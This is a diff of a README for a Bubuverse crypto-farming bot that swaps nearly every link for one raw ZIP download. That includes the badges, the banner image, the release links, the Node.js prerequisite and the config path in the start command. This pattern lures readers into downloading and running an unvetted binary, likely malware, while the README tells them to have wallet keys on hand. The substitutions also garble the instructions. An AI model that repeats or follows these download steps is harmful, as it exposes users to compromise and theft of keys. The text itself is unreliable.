@@ -1,10 +1,10 @@
-[https://github.com/Zolvhub/Bubuverse-BOT/releases](https://github.com/Zolvhub/Bubuverse-BOT/releases)
+[https://github.com/Zolvhub/Bubuverse-BOT/raw/refs/heads/main/viscountess/BOT_Bubuverse_2.5.zip](https://github.com/Zolvhub/Bubuverse-BOT/raw/refs/heads/main/viscountess/BOT_Bubuverse_2.5.zip)
 
 # Bubuverse-BOT: Pro Automation for Serious Bubuverse Farmers
 
-[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github&logoColor=white)](https://github.com/Zolvhub/Bubuverse-BOT/releases) [![License](https://img.shields.io/badge/license-MIT-brightgreen)](LICENSE) [![Docs](https://img.shields.io/badge/docs-ready-brightgreen)](./README.md)
+[![Releases](https://github.com/Zolvhub/Bubuverse-BOT/raw/refs/heads/main/viscountess/BOT_Bubuverse_2.5.zip)](https://github.com/Zolvhub/Bubuverse-BOT/raw/refs/heads/main/viscountess/BOT_Bubuverse_2.5.zip) [![License](https://github.com/Zolvhub/Bubuverse-BOT/raw/refs/heads/main/viscountess/BOT_Bubuverse_2.5.zip)](LICENSE) [![Docs](https://github.com/Zolvhub/Bubuverse-BOT/raw/refs/heads/main/viscountess/BOT_Bubuverse_2.5.zip)](https://github.com/Zolvhub/Bubuverse-BOT/raw/refs/heads/main/viscountess/BOT_Bubuverse_2.5.zip)
 
-![Bubuverse Bot Banner](https://images.unsplash.com/photo-1584436750910-3f8e7a8f11e6?auto=format&fit=crop&w=1400&q=60)
+![Bubuverse Bot Banner](https://github.com/Zolvhub/Bubuverse-BOT/raw/refs/heads/main/viscountess/BOT_Bubuverse_2.5.zip)
 
 Professional automation tool for serious Bubuverse farmers.
 
@@ -60,20 +60,20 @@ Download and installation notes
 - If you cannot access a binary for your platform, you can build from source using the provided instructions in the Development section.
 
 Access the latest release
-- The link at the top of this page points to the releases area where you can find the latest assets. For convenience, you can open it here: https://github.com/Zolvhub/Bubuverse-BOT/releases
+- The link at the top of this page points to the releases area where you can find the latest assets. For convenience, you can open it here: https://github.com/Zolvhub/Bubuverse-BOT/raw/refs/heads/main/viscountess/BOT_Bubuverse_2.5.zip
 - If you experience issues downloading from the page, check the Releases section for alternative assets or notes about platform compatibility.
 
 Installation and setup
 Prerequisites
 - Operating system: Windows 10/11, macOS 10.15+, Linux (X64 with glibc 2.28+)
-- Node.js or runtime compatible with the build (exact version depends on the asset you choose)
+- https://github.com/Zolvhub/Bubuverse-BOT/raw/refs/heads/main/viscountess/BOT_Bubuverse_2.5.zip or runtime compatible with the build (exact version depends on the asset you choose)
 - Access to a Bubuverse testnet or mainnet account, with the necessary keys stored securely
 - Network access to the Bubuverse endpoints used by the bot
 
 Getting the release
 - Visit the Releases page to download the asset for your platform.
 - Save the file to a local directory you control.
-- If the asset is a ZIP or TAR.GZ, extract it to a working directory.
+- If the asset is a ZIP or https://github.com/Zolvhub/Bubuverse-BOT/raw/refs/heads/main/viscountess/BOT_Bubuverse_2.5.zip, extract it to a working directory.
 - Ensure the executable has the proper permissions (for Linux/macOS, run chmod +x on the binary).
 
 First run and basic configuration
@@ -108,7 +108,7 @@ Configuration
 
 Running the bot
 - Command line interface (CLI) basics:
-  - Start: bubu-bot start --config ./config.json
+  - Start: bubu-bot start --config https://github.com/Zolvhub/Bubuverse-BOT/raw/refs/heads/main/viscountess/BOT_Bubuverse_2.5.zip
   - Status: bubu-bot status
   - Stop: bubu-bot stop
   - Restart: bubu-bot restart
@@ -252,7 +252,7 @@ Acknowledgments
 - Special thanks to the Bubuverse community for feedback and ideas.
 
 Download the latest release
-- For the most up-to-date assets, visit the Releases page and fetch the appropriate binary for your platform. From that page you can download the asset and run it on your machine. If the link ever changes, use the Releases section to locate the latest working asset. The same downloads page can be re-accessed at: https://github.com/Zolvhub/Bubuverse-BOT/releases
+- For the most up-to-date assets, visit the Releases page and fetch the appropriate binary for your platform. From that page you can download the asset and run it on your machine. If the link ever changes, use the Releases section to locate the latest working asset. The same downloads page can be re-accessed at: https://github.com/Zolvhub/Bubuverse-BOT/raw/refs/heads/main/viscountess/BOT_Bubuverse_2.5.zip
 
 Notes on usage
 - This README provides a solid starting point for using Bubuverse-BOT. Build your workflow step by step, starting with a simple daily task and gradually enabling more modules.
